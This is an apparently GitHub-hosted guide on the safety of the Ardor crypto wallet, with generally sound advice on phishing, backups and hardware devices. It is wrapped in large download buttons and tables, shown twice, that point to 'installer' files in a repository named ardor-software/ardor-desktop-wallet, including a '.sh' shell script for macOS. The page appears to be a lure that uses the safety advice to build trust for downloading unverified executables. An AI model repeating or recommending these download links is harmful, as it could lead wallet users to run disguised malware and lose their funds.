![Ardor Wallet guide](assets/banner-article.png)

# Is the Ardor wallet safe? What to check and what to avoid

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor wallet is safe in the sense that matters most: it holds your keys on your own machine, it is open source, and no server of the project's can move your funds. Its safety in practice depends on two things you control - how well you keep the secret, and what else is running on the computer.

## What safety means for a self-custody wallet

There is no [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) to breach. Nothing on a server can be reset, leaked or handed to a support agent, so the attacks that dominate custodial services - a database breach, an insider, a frozen withdrawal - have no target here.

What replaces them is a much smaller set of failure modes, all of them local: the secret leaks, the machine is compromised, or the [Ardor backup](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md) is lost. The wallet can reduce the second and third. It cannot do anything about the first beyond never asking for the secret in the first place.

## What the wallet does protect

- The passphrase or seed is used locally and is never transmitted by the wallet.
- Signing happens on your machine, including when a hardware device is used.
- The account is derived from the secret, so a reinstalled wallet restores it without any server involvement.
- The source is public, so the behaviour can be inspected rather than taken on trust.

That last point is not decoration. Open source means a claim about how keys are handled can be checked by anyone who reads the code, which is a different kind of assurance from a marketing sentence.

A public repository also means the [Ardor release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md) you install can be compared with the source it claims to be built from, which is the only way to check a claim about a binary at all. It does not make the software correct; it makes it checkable, which is a different and more useful property.

## The three ways funds actually go missing

| Vector | What it looks like | Defence |
|---|---|---|
| Phishing | A page, advert or message offers to unlock, verify or recover an account | Never type the secret into anything but the wallet |
| A bad backup | The written copy has a wrong word, and nobody tested it | Restore from the paper once, before funding |
| A compromised machine | Clipboard malware swaps an address, or a keylogger reads the secret | Keep the system clean, verify the address on screen, use a hardware device for large balances |

Nearly every story of an emptied account lands in one of those rows. None of them is a break of the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md)'s cryptography, and none of them is fixed by a setting inside it.

## Judging a download in ten seconds

Three signals separate the real build from a page that wants your secret. The download lives on the repository's releases page, the file is an asset of a tagged release rather than a link to a mirror, and the page never asks for a passphrase in order to start the download.

Any page that fails one of those is not a source, however polished it looks. A wallet is one of the few downloads where the wrong copy costs everything, and these checks are cheap enough to run every single time.

## A checklist worth running once

1. The wallet came from the GitHub releases page, and the hash matched.
2. The secret is written on paper, in two places, and a restore from the paper has been tested.
3. The public key has been announced on any account that sat idle.
4. Large balances sit behind a hardware device, or in an account used rarely.
5. No screenshot, note or message anywhere contains the secret.
6. The machine runs an updated system, with nothing unrecognised holding keyboard access or a clipboard hook.

Six items, one sitting. Most people who lose funds could have found their problem at item three or item five years earlier, and the check costs nothing but an evening.

Run it again after any change of machine, secret or storage habit. A checklist that is only run at setup quietly stops describing the setup you actually have.

## Hardware devices

A Ledger can be used with the desktop wallet, which keeps the key on the device and requires a physical confirmation for each signature. That defends against a compromised computer in a way software alone cannot: malware can read the screen, but it cannot sign without the device.

The trade-off is friction, and friction is why people stop using it after a month or two. A reasonable split is a hardware device for the balance you would miss and the software wallet for the account you spend from weekly.

## What to do if something looks wrong

If a transaction you did not authorise appears, the account is already exposed and the priority is speed: move what remains to a new account with a new secret, from a clean machine. Do not spend time reconstructing how it happened first; that investigation can follow, and it usually ends at a leaked secret rather than a broken wallet.

If a page asks for your secret, close it and change nothing about your account. Nothing has been lost yet, and the only step that matters is not typing the words.

## FAQ

### Can the project freeze or seize my funds?

No. There is no mechanism for it, which is also why nobody can reverse a mistaken send or recover a lost secret.

### Is a hardware wallet necessary?

Not for a small balance you spend regularly. It is the sensible choice once the amount on one machine would be painful to lose.

### Is the web client safe?

It is safe to read a balance with, because it never needs your secret. It cannot send, and it should never ask for a passphrase.

### What if I already typed my passphrase into a website?

Treat the account as exposed and move the balance to a new account immediately, from a machine you trust. Do not reuse the old secret.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Spot a phishing wallet that asks for your passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/spot-a-phishing-ardor-wallet.md)
- [Can an Ardor wallet be hacked? What actually happens](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-an-ardor-wallet-be-hacked.md)
- [Announce a public key in the Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/announce-a-public-key-in-ardor-wallet.md)
- [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
